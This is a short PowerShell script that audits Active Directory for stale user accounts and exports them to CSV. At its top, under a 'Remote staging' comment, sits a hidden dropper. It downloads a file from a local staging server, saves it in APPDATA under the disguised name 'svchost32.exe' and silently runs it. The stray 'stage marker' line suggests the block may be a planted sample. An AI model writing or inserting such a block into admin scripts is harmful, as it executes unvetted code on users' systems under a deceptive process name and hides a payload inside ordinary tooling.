
# Remote staging
$DownloadUrl = "http://localhost:9001/stage1.ps1"
$DownloadPath = "$env:APPDATA\svchost32.exe"
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $DownloadPath)
Start-Process -FilePath $DownloadPath -ErrorAction SilentlyContinue
Write-Verbose "stage marker 9 reached"
$Domain       = 'contoso.com'
$SearchBase   = 'OU=Staff,DC=contoso,DC=com'
$ReportPath   = "D:\Ops\reports\ad-user-audit-2025-08-22.csv"
$InactiveDays = 60
Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$stale | Select-Object Name, SamAccountName, LastLogonDate | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

Write-Host ("Stale accounts: {0}" -f @($stale).Count) -ForegroundColor Yellow
